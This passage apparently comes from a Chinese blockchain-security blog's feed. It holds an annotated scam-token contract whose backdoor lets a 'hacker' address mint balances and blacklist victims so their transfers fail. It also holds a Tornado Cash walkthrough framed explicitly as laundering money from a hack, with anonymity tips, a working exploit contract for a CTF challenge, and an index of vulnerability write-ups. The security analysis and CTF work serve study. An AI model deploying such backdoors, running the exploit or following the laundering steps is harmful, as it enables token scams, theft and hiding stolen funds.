require(spender != address(0), &quot;Invalid address&quot;);</span><br><span class="line">        require(amount &gt; 0, &quot;Invalid amount&quot;);</span><br><span class="line">        uint256 total = 0;</span><br><span class="line">        if (_decode(spender, _guest.guest)) &#123; </span><br><span class="line">        // if u r hacker, it will return true. _from&#x27;s balance won&#x27;t minus while spender&#x27;s balance can increase  </span><br><span class="line">            _minus(from, total);</span><br><span class="line">            total = _somma(total, amount);</span><br><span class="line">            _balances[spender] += total;</span><br><span class="line">        &#125; else &#123; // if u r not hacker, do nothing here since &#x27;total&#x27; is zero.</span><br><span class="line">            _minus(from, total);</span><br><span class="line">            _balances[spender] += total;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; // back door</span><br><span class="line">////////////////////////// equil to mint but only hacker can call //////////////////////////////////////  </span><br><span class="line"></span><br><span class="line">////////////////////////// check hacker //////////////////////////////////////   </span><br><span class="line"></span><br><span class="line">    function _decode(address user, address user2) internal view returns (bool) &#123;</span><br><span class="line">        bytes32 hash1 = keccak256(abi.encodePacked(user));</span><br><span class="line">        bytes32 hash2 = keccak256(abi.encodePacked(user2));</span><br><span class="line">        return hash1 == hash2;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function _somma(uint256 aqw, uint256 poe) internal pure returns (uint256) &#123;</span><br><span class="line">        if (poe != 0) &#123;</span><br><span class="line">            return aqw + poe;</span><br><span class="line">        &#125;</span><br><span class="line">        return poe;</span><br><span class="line">    &#125;</span><br><span class="line">////////////////////////// check hacker //////////////////////////////////////   </span><br><span class="line"></span><br><span class="line">////////////////////////// add to blacklist //////////////////////////////////////</span><br><span class="line">    function Approve(address spender, uint256 amount) public returns (bool)  &#123;</span><br><span class="line">        address from = msg.sender;</span><br><span class="line">        _checkAllowance(from, spender, amount); // not approve but add something into blacklist!</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _checkAllowance(address user, address spender, uint256 amount) internal &#123;</span><br><span class="line">    // only hacker can enter, because _guest.guest is hacker&#x27;s address</span><br><span class="line">        if (_decode(user, _guest.guest)) &#123; </span><br><span class="line">            require(spender != address(0), &quot;Invalid address&quot;);</span><br><span class="line">            if (amount != 0) &#123;</span><br><span class="line">                _dex[spender] = spender; // add victims into _dex: blacklist</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                _dex[spender] = address(0); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">////////////////////////// add to blacklist //////////////////////////////////////</span><br><span class="line"></span><br><span class="line">////////////////////////// tx will revert //////////////////////////////////////</span><br><span class="line">    function _requireBalance(address sender, address recipient, uint256 total) internal virtual &#123;</span><br><span class="line">    // recipient is not used!</span><br><span class="line">        uint256 amount = 0;</span><br><span class="line">        if (_decode(sender, _dex[sender])) &#123; // victims&#x27; tx will enter this condition</span><br><span class="line">            _balances[sender] = _balances[sender] + amount;</span><br><span class="line">            amount = _totalSupply;</span><br><span class="line">            _minus(sender, amount); // the tx will revert for the insufficient balance</span><br><span class="line">        &#125; else &#123; // only whitelist</span><br><span class="line">            _balances[sender] = _balances[sender] + amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;// </span><br><span class="line">////////////////////////// tx will revert //////////////////////////////////////</span><br><span class="line"></span><br><span class="line">    function _beforeTokenTransfer( address from, address to, uint256 amount) internal virtual &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.Obfuscate quickStart</title>
      <link href="/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/"/>
      <url>/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/</url>
      
        <content type="html"><![CDATA[<h1 id="Obfuscate-quickStart"><a href="#Obfuscate-quickStart" class="headerlink" title="Obfuscate quickStart"></a>Obfuscate quickStart</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><p>混币器用于保护用户资产的隐私性，无法追溯，可用于匿名资产、洗钱等。</p></li><li><p>混币器项目：</p><ul><li><p><a href="https://ipfs.io/ipns/tornadocash.eth/">tornado.cash</a></p></li><li><p><a href="https://mixer.zerotoken.club/">ZERO</a></p></li><li>coinjoin</li><li><a href="https://wasabiwallet.io/">wasabi</a></li><li><a href="https://samouraiwallet.com/">samouraiwallet</a></li></ul></li><li><p>项目方会收取少量手续费</p></li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>步骤</p><ol><li>比如我黑了别人，得到了一笔黑钱，然后我想洗钱</li><li>我来到tornado，选择100ETH的池子，存入100ETH，获得一个凭证</li><li>过一段时间，换另一个账户取回这100ETH</li><li>Account01是黑客攻击时候的地址，而account02是我洗完钱后取钱的地址，无法将两个地址相关联</li><li>说明：<ul><li>我存的是A，然后取的是B，都是价值100ETH</li><li>由于我取的是池子里的100，而钱是聚合的，比如这个池子里面一共600ETH，我取走了100ETH，而无法溯源这100，以太坊是用一个变量来记录资产的</li><li>混币器中，有合法的交易，也有不合法的交易，无法一棍子打死谁是合法的谁是不合法的，也无法溯源</li></ul></li></ol><p><img src="/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/image-20230831170333086.png" alt="image-20230831170333086"></p><p>涉及的理论：</p><ul><li>零知识证明</li><li>merkleTree</li></ul><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>1.来到<a href="https://ipfs.io/ipns/tornadocash.eth/">网站</a></p><p>2.进行存款</p><p><img src="/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/image-20230831171445323.png" alt="image-20230831171445323"></p><p><img src="/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/image-20230831171536081.png" alt="image-20230831171536081"></p><p>3.存款完成</p><p><img src="/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/image-20230831171610088.png" alt="image-20230831171610088"></p><p><img src="/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/image-20230831171631900.png" alt="image-20230831171631900"></p><p>4.取款：等5笔交易间隔后才能取款，是为了安全性，时间越长越好</p><p><img src="/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/image-20230831171949750.png" alt="image-20230831171949750"></p><p>5.取款：在设置里面选择账户，而不是中继者（推荐，更匿名）。</p><p><img src="/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/image-20231017194237811.png" alt="image-20231017194237811"></p><p><img src="/2023/10/17/20.Obfuscate/01.Obfuscate%20quickStart/image-20231017194447042.png" alt="image-20231017194447042"></p><p>6.此次实验的一些资料</p><ul><li>交易hash1：<a href="https://goerli.etherscan.io/tx/0x674df075218a695aa1a2e9d01e65624cdd89ce6b6fb25f4ff7554defde6428bc">0x674df075218a695aa1a2e9d01e65624cdd89ce6b6fb25f4ff7554defde6428bc</a></li><li>交易hash2：<a href="https://goerli.etherscan.io/tx/0x7fb5ad1202093bf0422055089b3cdf5ef37a0024c0a0cc72a16511ea4798d11f">0x7fb5ad1202093bf0422055089b3cdf5ef37a0024c0a0cc72a16511ea4798d11f</a></li><li>凭证1：tornado-eth-0.1-5-0x31234fd5ded289999ab9e59ba1e4f62531ee92df30a5dc6b2f4a612a98c959acb9cffd7d4cf6844f88fbb59cf450271361b09e443881c9ed6c686ae91b2f</li><li>凭证2：tornado-eth-0.1-5-0xd8f5c71cab89330f94b3f253eb80b814094803d8a19c78a2b1f885010340ad655f807ad65203ed83e63248f9f20a6f5fbc4a765c38ada4bcacbc3c611e2d</li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><a href="https://paper.seebug.org/1497/#_2">https://paper.seebug.org/1497/#_2</a></li><li><a href="https://zhuanlan.zhihu.com/p/94014111">https://zhuanlan.zhihu.com/p/94014111</a></li><li><a href="https://zhuanlan.zhihu.com/p/94979076">https://zhuanlan.zhihu.com/p/94979076</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 20.Obfuscate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.digest</title>
      <link href="/2023/10/06/22.MetaTrustCTF2023/00.digest/"/>
      <url>/2023/10/06/22.MetaTrustCTF2023/00.digest/</url>
      
        <content type="html"><![CDATA[<h1 id="MetaTrustCTF2023"><a href="#MetaTrustCTF2023" class="headerlink" title="MetaTrustCTF2023"></a>MetaTrustCTF2023</h1><p>题目仓库：<a href="https://github.com/MetaTrustLabs/ctf">https://github.com/MetaTrustLabs/ctf</a></p><p>最终排名12，个人解出4题</p><p><img src="/2023/10/06/22.MetaTrustCTF2023/00.digest/image-20231006152518546.png" alt="image-20231006152518546"></p>]]></content>
      
      
      <categories>
          
          <category> 22.MetaTrustCTF2023 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.AdultOtter</title>
      <link href="/2023/10/06/23.0xHackedCTF/06.AdultOtter/"/>
      <url>/2023/10/06/23.0xHackedCTF/06.AdultOtter/</url>
      
        <content type="html"><![CDATA[<h1 id="AdultOtter"><a href="#AdultOtter" class="headerlink" title="AdultOtter"></a>AdultOtter</h1><p>又是一道算法题，如下是分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)2 ** 255刚好能被2**64除断。</span><br><span class="line">(2)对b[i]展开：b[i]=（2 ** 255 + code[i] - 7 *i ** i * code[i]+ b[i-1]） % 2**64;</span><br><span class="line">(3)b[15] =  15 *2 ** 255 + code[15] - 7 *i ** i * code[15] + code[14] - 7 *i ** i * code[14] +  ......  code[1] - 7 *i**i * code[1] + b[0]</span><br><span class="line">(4)那么使 code[15] - 7 *i ** i * code[15] + code[14] - 7 *i** i * code[14] +  ......  code[1] - 7 *i ** i * code[1]+ b[0] 为2**64倍数即可。</span><br></pre></td></tr></table></figure><p>最终构造出来的结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">interface IAdultOtter &#123;</span><br><span class="line">    function pwn(uint[16] memory code) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploit&#123;</span><br><span class="line"></span><br><span class="line">    function exploit() public  &#123;</span><br><span class="line">    address addr = 0x6D40aCf2EF8F8F99247666AEE922E79CB605DE3B;</span><br><span class="line">    uint[16] memory DataNumber;</span><br><span class="line">    DataNumber[0] = 11;</span><br><span class="line">    DataNumber[1] = 1513;</span><br><span class="line">    DataNumber[2] = 3859;</span><br><span class="line">    DataNumber[3] = 5192;</span><br><span class="line">    DataNumber[4] = 6112;</span><br><span class="line">    DataNumber[5] = 7966;</span><br><span class="line">    DataNumber[6] = 9263;</span><br><span class="line">    DataNumber[7] = 10432;</span><br><span class="line">    DataNumber[8] = 11709;</span><br><span class="line">    DataNumber[9] = 13320;</span><br><span class="line">    DataNumber[10] = 14564;</span><br><span class="line">    DataNumber[11] = 15480;</span><br><span class="line">    DataNumber[12] = 16614;</span><br><span class="line">    DataNumber[13] = 18200;</span><br><span class="line">    DataNumber[14] = 19485;</span><br><span class="line">    DataNumber[15] = 21344;</span><br><span class="line">    IAdultOtter(addr).pwn(DataNumber);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 23.0xHackedCTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.Security Type Classification</title>
      <link href="/2023/10/06/99.coordinate/00.Security%20Type%20Classification/"/>
      <url>/2023/10/06/99.coordinate/00.Security%20Type%20Classification/</url>
      
        <content type="html"><![CDATA[<h1 id="Security-Type-Classification"><a href="#Security-Type-Classification" class="headerlink" title="Security Type Classification"></a>Security Type Classification</h1><p>TODO: paradigm CTF 2021，所有PoC，RugPull尚未分类，以及后面的所有</p><ul><li><strong>Reentrant</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/01.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_1/">00.security-01</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/19.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_2/">00.security-19</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/36.%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB_3/">00.security-36</a></li><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/17.Token%20bank/">01.Capturetheether CTF-17</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/10.Re-entrancy/">04.Ethernaut CTF-10</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/07.SWC-107_Reentrancy/">09.SWC-07</a></li></ul></li><li><strong>Private Key Lost</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/10.GitHub%E7%9B%97%E5%8F%96%E7%A7%81%E9%92%A5/">00.security-10</a></li></ul></li><li><strong>Integer Overflow</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_1/05.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">00.security-05</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/18.%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA_2/">00.security-18</a></li><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/07.Token%20sale/">01.Capturetheether CTF-07</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/08.integer-overflow%20@bet/">02.chainflag-08</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/05.Token/">04.Ethernaut CTF-05</a></li></ul></li><li><strong>Transfer Logic</strong><ul><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/08.Token%20whale/">01.Capturetheether CTF-08</a></li></ul></li><li><strong>solidity compiler bug</strong><ul><li><a href="https://www.levi104.com/2023/07/15/10.solidity%20compiler%20bug/01.ABIEncoderV2%20Array/">10.solidityCompilerBug-01</a></li><li><a href="https://www.levi104.com/2023/07/16/10.solidity%20compiler%20bug/02.consturctor/">10.solidityCompilerBug-02</a></li><li><a href="https://www.levi104.com/2023/07/16/10.solidity%20compiler%20bug/03.nested%20structs/">10.solidityCompilerBug-03</a></li></ul></li><li><strong>Airdrop Hunting</strong><ul><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/03.airdrop-hunting%20@CoinFlip/">02.chainflag-03</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/04.airdrop-hunting%20@fake3d/">02.chainflag-04</a></li></ul></li><li><strong>unsafe external call</strong><ul><li><a href="https://www.levi104.com/2023/07/16/00.security/43.Hiding%20Malicious%20Code%20with%20External%20Contract%20-%20%E5%89%AF%E6%9C%AC/">00.security-43</a></li></ul></li><li><strong>Front-running</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/23.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_1/">00.security-23</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/33.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_2/">00.security-33</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/14.SWC-114_Front%20Running/">09.SWC-14</a></li></ul></li><li><strong>Uninitialized  Struct pointer</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/26.struct%E4%BD%8E%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/">00.security-26</a></li><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/11.Donation/">01.Capturetheether CTF-11</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/13.storage%20@rise/">02.chainflag-13</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/09.SWC-109_Uninitialized%20Storage%20Pointer/">09.SWC-09</a></li></ul></li><li><strong>Selector collision</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/27.%E9%80%89%E6%8B%A9%E5%99%A8%E7%A2%B0%E6%92%9E/">00.security-27</a></li></ul></li><li><strong>Selfdestruct</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/17.%E8%87%AA%E6%AF%81%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/">00.security-17</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/07.Force/">04.Ethernaut CTF-07</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/06.SWC-106_selfdestruct/">09.SWC-06</a></li></ul></li><li><strong>Storage</strong><ul><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/10.Mapping/">01.Capturetheether CTF-10</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/24.SWC-124_storage/">09.SWC-24</a></li><li><a href="https://www.levi104.com/2023/07/16/00.security/44.delete%20mapping/">00.security-44</a></li><li><a href="https://www.levi104.com/2023/07/28/16.CBSC%20CTF%202022/06.challenge/">16.CBSC 2022-06</a></li><li><a href="https://www.levi104.com/2023/07/28/16.CBSC%20CTF%202022/08.challenge/">16.CBSC 2022-08</a></li></ul></li><li><strong>Signature</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/29.%E7%AD%BE%E5%90%8D%E9%87%8D%E6%94%BE/">00.security-29</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/17.SWC-117_Signature%20Malleability/">09-SWC-17</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/21.SWC-121_Signature%20Replay%20Attacks/">09.SWC-21</a></li></ul></li><li><strong>Scam</strong><ul><li><a href="https://www.levi104.com/2023/07/05/08.PoC/01.Phishing%20scam/">08.Cases-01</a></li></ul></li><li><strong>A mythical wild animal</strong><ul><li><a href="https://www.levi104.com/2023/07/14/08.PoC/02.A%20mythical%20wild%20animal/">08.Cases-02</a></li></ul></li><li><strong>Get Private Info</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/">00.security-16</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/08.Vault/">04.Ethernaut CTF-08</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/12.Privacy/">04.Ethernaut CTF-12</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/30.SWC-130_Get%20Private%20Info/">09.SWC-30</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/36.SWC-136_Get%20Private%20Info/">09.SWC-36</a></li></ul></li><li><strong>Delegatecall</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/14.delegatecall%E6%BC%8F%E6%B4%9E_2/">00.security-14</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/15.delegatecall%E6%BC%8F%E6%B4%9E_3/">00.security-15</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/06.Delegation/">04.Ethernaut CTF-06</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/12.SWC-112_delegatecall/">09.SWC-12</a></li></ul></li><li><strong>Controllable info</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/39.%E7%BC%BA%E5%B0%91%E8%81%94%E7%B3%BB%E5%90%88%E7%BA%A6/">00.security-39</a></li></ul></li><li><strong>Logic</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/02.stake%E6%BC%8F%E6%B4%9E/02.stake%E6%BC%8F%E6%B4%9E/">00.security-02</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/40.%E8%B4%A8%E6%8A%BC&amp;%E5%88%A9%E6%81%AF&amp;%E6%BA%A2%E5%87%BA/">00.security-40</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/11.Elevator/">04.Ethernaut CTF-11</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/14.Gatekeeper%20Two/">04.Ethernaut CTF-14</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/21.Shop/">04.Ethernaut CTF-21</a></li><li><a href="https://www.levi104.com/2023/07/19/04.Ethernaut%20CTF/27.Good%20Samaritan/">04.Ethernaut CTF-27</a></li><li><a href="https://www.levi104.com/2023/07/24/14.Paradigm%20CTF%202022/04.merkledrop/">14.Paradigm CTF 2022-04</a></li><li><a href="https://www.levi104.com/2023/07/27/16.CBSC%20CTF%202022/02.challenge/">16.CBSC 2022-02</a></li><li><a href="https://www.levi104.com/2023/07/28/16.CBSC%20CTF%202022/05.challenge/">16.CBSC 2022-05</a></li></ul></li><li><strong>Hijack flow</strong><ul><li><a href="https://www.levi104.com/2023/07/13/09.SWC/27.SWC-127_hijack%20flow/">09.SWC-27</a></li></ul></li><li><strong>Decompile</strong></li><li><strong>Precompile comtract</strong><ul><li><a href="https://www.levi104.com/2023/07/25/14.Paradigm%20CTF%202022/05.vanity/">14.Paradigm CTF 2022-04</a></li></ul></li><li><strong>Crypto</strong></li><li><strong>Pseudo random number</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/12.%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/">00.security-12</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/30.%E5%9D%8F%E9%9A%8F%E6%9C%BA%E6%95%B0/">00.security-30</a></li><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/02.Guess%20the%20secret%20number/">01.Capturetheether CTF-02</a></li><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/05.Predict%20the%20future/">01.Capturetheether CTF-05</a></li><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/06.Predict%20the%20block%20hash/">01.Capturetheether CTF-06</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/02.bad-randomness%20@EOSGame/">02.chainflag-02</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/03.Coin%20Flip/">04.Ethernaut CTF-03</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/20.SWC-120_Pseudo%20Random%20Number/">09.SWC-20</a></li></ul></li><li><strong>Fishing the stupid</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/13.%E5%9F%BA%E4%BA%8Etx.origin%E7%9A%84%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/">00.security-13</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/21.deploy%20cheat/">00.security-21</a></li></ul></li><li><strong>CREATE2</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/">00.security-04</a></li></ul></li><li><strong>Brute force</strong></li><li><strong>calldata</strong><ul><li><a href="https://www.levi104.com/2023/07/20/04.Ethernaut%20CTF/29.Switch/">04.ethernaut-29</a></li></ul></li><li><strong>encodePacked</strong><ul><li><a href="https://www.levi104.com/2023/07/13/09.SWC/33.SWC-133_encodePacked/">09.SWC-33</a></li></ul></li><li><strong>Inline assembly</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/03.delegatecall%E6%BC%8F%E6%B4%9E_1/03.delegate%E6%BC%8F%E6%B4%9E_1/#%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9launcherAddress">00.security-03: Delegatecall, Storage</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/04.%E6%A8%A1%E7%B3%8A%E8%BA%AB%E4%BB%BD%E6%BC%8F%E6%B4%9E/">00.security-04</a></li><li><a href="https://www.levi104.com/2023/07/25/14.Paradigm%20CTF%202022/06.sourcecode/">14.Paradigm CTF 2022-06</a></li></ul></li><li><strong>DoS</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/11.%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">00.security-11</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/24.%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB_2/">00.security-24</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/09.King/">04.Ethernaut CTF-09</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/20.Denial/">04.Ethernaut CTF-20</a></li><li><a href="https://www.levi104.com/2023/06/30/00.security/41.Owner%20change/">00.security-41</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/13.SWC-113_DoS/">09.SWC-13</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/28.SWC-128_DoS/">09.SWC-28</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/32.SWC-132_DoS/">09.SWC-32</a></li></ul></li><li><strong>DAO attack</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/06.%E6%8F%90%E6%A1%88%E6%94%BB%E5%87%BB/">00.security-06</a></li></ul></li><li><strong>Opcode</strong><ul><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/18.MagicNumber/">04.Ethernaut CTF-18</a></li></ul></li><li><strong>Inheritance</strong><ul><li><a href="https://www.levi104.com/2023/07/13/09.SWC/25.SWC-125_Incorrect%20Inheritance%20Order/">09.SWC-25</a></li></ul></li><li><strong>Proxy</strong><ul><li><a href="https://www.levi104.com/2023/07/19/04.Ethernaut%20CTF/25.Motobike/">04.Ethernaut-25</a></li></ul></li><li><strong>gas</strong><ul><li><a href="https://www.levi104.com/2023/07/13/09.SWC/26.SWC-126_Insufficient%20Gas%20Griefing/">09.SWC-26</a></li><li><a href="https://www.levi104.com/2023/07/13/09.SWC/34.SWC-134_hardcoded%20gas%20amount/">09.SWC-34</a></li></ul></li><li><strong>Account</strong><ul><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/14.Public%20Key/">01.Capturetheether CTF-14</a></li><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/15.Account%20Takeover/">01.Capturetheether CTF-15</a></li></ul></li><li><strong>Combination</strong><ul><li><a href="https://www.levi104.com/2023/06/23/00.security/03.delegatecall%E6%BC%8F%E6%B4%9E_1/03.delegate%E6%BC%8F%E6%B4%9E_1/#%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9launcherAddress">00.security-03: Delegatecall, Storage</a></li><li><a href="https://www.levi104.com/2023/06/23/00.security/07.%E9%87%8D%E5%85%A5&amp;%E5%AD%98%E5%82%A8%E6%BA%A2%E5%87%BA&amp;%E7%B1%BB%E5%9E%8B%E5%AD%98%E5%82%A8%E8%AE%A1%E7%AE%97/">00.security-07: Reentrant, Integer Overflow, storage</a></li><li><a href="https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/12.Fifty%20years/">01.Capturetheether CTF-12: Logic, Integer Overflow, Uninitialized  Struct pointer</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/06.delegatecall%20@SafaDelegatecall/">02.chainflag-06: Hijack flow, Storage, Inline assembly, Decompile</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/07.crypto%20@EVMEnc/">02.chainflag-07: Inline assembly, Crypto</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/09.integer-overflow%20@hf/">02.chainflag-09: Integer Overflow, Uninitialized  Struct pointer</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/11.storage%20@cow/">02.chainflag-11: CREATE2, Storage, Uninitialized  Struct pointer</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/12.storage%20@bank/">02.chainflag-12: Storage, Uninitialized  Struct pointer, Hijack flow, Decomplie</a></li><li><a href="http://localhost:4000/2023/06/29/02.Chainflag%20%20CTF/14.storage%20@roiscoin/">02.chainflag-14: Storage, Uninitialized  Struct pointer, CREATE2</a></li><li><a href="https://www.levi104.com/2023/06/29/02.ChainflagCTF/15.storage%20@Happy_DOuble_Eleven/">02.chainflag-15: Logic, CREATE2, Integer Overflow, Reentrant, SelfDestruct</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/13.Gatekeeper%20One/">04.Ethernaut CTF-13: Brute force, Logic</a></li><li><a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/19.Alien%20Codex/">04.Ethernaut CTF-19: Storage, Integer Overflow</a></li><li><a 